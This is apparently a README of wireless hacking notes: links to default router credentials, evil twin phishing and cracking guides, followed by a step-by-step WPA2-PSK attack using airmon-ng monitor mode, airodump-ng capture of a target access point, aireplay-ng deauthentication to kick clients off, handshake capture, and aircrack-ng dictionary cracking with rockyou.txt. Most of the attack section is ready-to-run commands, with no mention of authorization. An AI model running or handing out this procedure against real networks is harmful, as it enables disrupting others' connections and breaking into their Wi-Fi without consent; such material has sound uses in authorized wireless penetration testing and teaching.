# wireless_hacking

Useful references for wireless security testing.

## Resources
- **Default router credentials**  
  https://gist.github.com/austinsonger/d70bbc36b88da097f1ce58c9add0c923

- **Evil Twin (AP replication & phishing attack)**  
  https://www.hackers-arise.com/post/2018/06/20/Wireless-Hacking-How-to-Hack-a-Wi-Fi-AP-without-Cracking-Passwords

- **Wireless hacking cheat sheet**  
  https://github.com/ivan-sincek/wifi-penetration-testing-cheat-sheet

- **WPA2-PSK cracking with aircrack-ng**  
  https://www.hackers-arise.com/post/2017/06/27/Wireless-Hacking-Cracking-the-WPA2-PSK-with-aircrack-ng
  
- **How to Hack WPA2 and Defend Against These Attacks**
  https://www.freecodecamp.org/news/wi-fi-hacking-101/


## WIFI-Deauth Attack
### S1. configuring monitoring mode

**1st method**

`airmon-ng start wlan0` ability to determine the name of the wireless card, allowing the Monitor mode to be enabled on the wlan0 port (e.g. mon, mon0, wlan0mon, etc.)
`iwconfig` name - checking activation status of Monitor mode
`airmon-ng stop wlan0` - stopping
the Monitor mode (return to Managed
mode)

**2nd method**

`iwconfig wlan0` - status check

`ifconfig wlan0 down` - deactivation of wlan card

`iwconfig wlan0 mode monitor` - Monitor mode activation

`ifconfig wlan0 up` - card activation

### **S2: Capture Traffic with airodump-Ng**

`airodump-ng wlan0` - start monitor

### **Step 3: Focus airodump-ng on One AP on One Channel**

```python
airodump-ng --bssid 58:8B:F3:E6:18:xx -c 11 --write WPAcrack mon0
```

**58:8B:F3:E6:18:xx i**s the `--bssid` of the AP

`-c` 11 is the channel the AP is operating on

`WPAcrack` is the file you want to write to

`mon0` the monitoring wireless adapter

### **Step 4: aireplay-ng deauth**

In order to capture the encrypted password, we need to have the client authenticate against the AP. If they're already authenticated, we can de-authenticate them (kick them off) and their system will automatically re-authenticate, whereby we can grab their encrypted password in the process.

open another terminal and type:

```python
kali> aireplay-ng --deauth 100 -a  58:8B:F3:E6:18:77 mon0
```

- **100** is the number of de-authenticate frames you want to send

### **Step 5: Capture the Handshake**

In the previous step, we bounced the user off their own AP, and now when they re-authenticate, airodump-ng will attempt to grab their password in the new 4-way handshake. Go back to our airodump-ng terminal and check to see whether or not we've been successful.

<img width="971" height="433" alt="wirelesshacking02" src="https://github.com/user-attachments/assets/49ff225a-a144-4148-80c8-dfb0bb08590b" />


If you are successful in capturing the 4-way handshake, the top line to the far right of airodump-ng says "**WPA handshake**" .This is the way it tells us we were successful in grabbing the encrypted password! That is the first step to success!

### **Step 6: Let's Aircrack-Ng That Password!**

Now that we have the encrypted password in our file `WPAcrack`, we can run that file against aircrack-ng using a password file of our choice. Remember that this type of attack is only as good as your password file. I'll be using the large wordlist on Kali named rockyou.txt. You can find it by typing;

`kali > locate wordlist`

We'll now attempt to crack the password by opening another terminal and typing:

```python
kali > aircrack-ng WPAcrack-01.cap -w /usr/share/wordlists/rockyou.txt
```

<img width="992" height="596" alt="wirelesshacking01" src="https://github.com/user-attachments/assets/a03b4489-ff73-4791-9433-3b017839790f" />

